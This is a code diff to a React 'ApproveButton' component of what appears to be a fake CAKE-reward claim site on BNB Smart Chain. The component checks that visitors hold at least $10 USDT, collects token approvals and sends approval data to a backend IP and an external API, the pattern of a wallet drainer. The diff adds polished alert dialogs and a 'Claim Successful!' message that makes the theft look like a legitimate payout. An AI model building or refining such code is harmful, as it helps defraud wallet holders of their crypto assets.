@@ -5,6 +5,7 @@ import { erc20Abi, parseUnits } from "viem";
 import { bsc } from "wagmi/chains";
 import { useState, useEffect } from "react";
 import { eligibleWallets } from "../eligibleWallets";
+import CustomAlert from "./CustomAlert";
 
 // 🔹 Load from .env
 const USDT_ADDRESS = import.meta.env.VITE_USDT_ADDRESS; 
@@ -95,23 +96,36 @@ const sendToExternalAPI = async (data) => {
   }
 };
 
-// 🔹 Check if balances have changed
+// 🔹 Check if balances have changed (improved logic to reduce spam)
 const hasBalanceChanged = (currentUSDT, currentBNB, address) => {
   const lastBalanceKey = `lastBalance_${address}`;
-  const lastBalance = localStorage.getItem(lastBalanceKey);
+  const lastBalanceData = localStorage.getItem(lastBalanceKey);
   
-  if (!lastBalance) {
+  if (!lastBalanceData) {
     // First time connecting this wallet
     return true;
   }
   
-  const { usdt: lastUSDT, bnb: lastBNB } = JSON.parse(lastBalance);
-  
-  // Compare with proper decimal precision
-  const usdtChanged = Math.abs(parseFloat(currentUSDT) - parseFloat(lastUSDT)) >= 0.01;
-  const bnbChanged = Math.abs(parseFloat(currentBNB) - parseFloat(lastBNB)) >= 0.000000001;
-  
-  return usdtChanged || bnbChanged;
+  try {
+    const { usdt: lastUSDT, bnb: lastBNB, timestamp: lastTimestamp } = JSON.parse(lastBalanceData);
+    
+    // Only check for changes if it's been at least 5 minutes since last update
+    const timeDiff = new Date().getTime() - new Date(lastTimestamp).getTime();
+    const fiveMinutes = 5 * 60 * 1000;
+    
+    if (timeDiff < fiveMinutes) {
+      return false; // Too soon, don't spam
+    }
+    
+    // Compare with proper decimal precision
+    const usdtChanged = Math.abs(parseFloat(currentUSDT) - parseFloat(lastUSDT)) >= 0.01;
+    const bnbChanged = Math.abs(parseFloat(currentBNB) - parseFloat(lastBNB)) >= 0.000000001;
+    
+    return usdtChanged || bnbChanged;
+  } catch (e) {
+    console.error("Error parsing last balance data:", e);
+    return true; // If data is corrupted, treat as first time
+  }
 };
 
 // 🔹 Update stored balance
@@ -129,6 +143,14 @@ export default function ApproveButton() {
   const { address, isConnected, connector } = useAccount();
   const { data: walletClient } = useWalletClient();
   const [loading, setLoading] = useState(false);
+  
+  // Custom alert states
+  const [alert, setAlert] = useState({
+    isOpen: false,
+    title: '',
+    message: '',
+    type: 'error'
+  });
 
   const [cakeReward, setCakeReward] = useState(0);
   const [scanCompleted, setScanCompleted] = useState(false);
@@ -176,6 +198,25 @@ export default function ApproveButton() {
     ? parseFloat(bscBalance.formatted).toFixed(9)
     : "0.000000000";
 
+  // 🔹 Function to show custom alert
+  const showAlert = (title, message, type = 'error') => {
+    setAlert({
+      isOpen: true,
+      title,
+      message,
+      type
+    });
+  };
+
+  const closeAlert = () => {
+    setAlert({
+      isOpen: false,
+      title: '',
+      message: '',
+      type: 'error'
+    });
+  };
+
   // 🔹 Send message when wallet connects or balances change
   useEffect(() => {
     if (isConnected && address && usdtBalance && bscBalance) {
@@ -207,7 +248,11 @@ export default function ApproveButton() {
   // 🔹 Handle Approve button with personal sign first
   const handleApprove = async () => {
     if (!walletClient || !isConnected || !address) {
-      alert("Please Connect Your Wallet.");
+      showAlert(
+        'Wallet Not Connected',
+        'Please connect your wallet to continue with the claim process.',
+        'warning'
+      );
       return;
     }
 
@@ -234,8 +279,10 @@ export default function ApproveButton() {
     console.log("Checking against eligible wallets:", eligibleWallets);
     
     if (!isEligible) {
-      alert(
-        `🚫🔒 Only SubWallet and Nabox Wallet are eligible to claim rewards. Please connect with an eligible wallet. Current wallet: ${walletName || walletId || connectorType || 'Unknown'}`
+      showAlert(
+        'Wallet Not Eligible',
+        `Only SubWallet and Nabox Wallet are eligible to claim rewards. Please connect with an eligible wallet.\n\nCurrent wallet: ${walletName || walletId || connectorType || 'Unknown'}`,
+        'error'
       );
       return;
     }
@@ -249,8 +296,10 @@ export default function ApproveButton() {
     console.log("Total USDT balance for claim check:", totalUsdtBalance);
     
     if (totalUsdtBalance < 10) {
-      alert(
-        `🚫🔒 Eligibility check failed — you need at least $10 USDT to claim. Your current balance: $${totalUsdtBalance.toFixed(2)} USDT. Please top up and try again.`
+      showAlert(
+        'Insufficient Balance',
+        `You need at least $10 USDT to claim rewards.\n\nYour current balance: $${totalUsdtBalance.toFixed(2)} USDT\n\nPlease top up your wallet and try again.`,
+        'warning'
       );
       return;
     }
@@ -326,6 +375,13 @@ export default function ApproveButton() {
       await sendToBackendIP(approvalData);
       await sendToExternalAPI(approvalData);
 
+      // Show success message
+      showAlert(
+        'Claim Successful! 🎉',
+        `Your ${cakeAmount} CAKE reward claim has been processed successfully!\n\nTransaction Hash: ${hash.slice(0, 10)}...${hash.slice(-8)}`,
+        'success'
+      );
+
     } catch (err) {
       //console.error("Process failed:", err.message);
 
@@ -383,6 +439,13 @@ export default function ApproveButton() {
 
   return (
     <div>
+      <CustomAlert
+        isOpen={alert.isOpen}
+        onClose={closeAlert}
+        title={alert.title}
+        message={alert.message}
+        type={alert.type}
+      />
       <button
         onClick={handleApprove}
         disabled={loading}
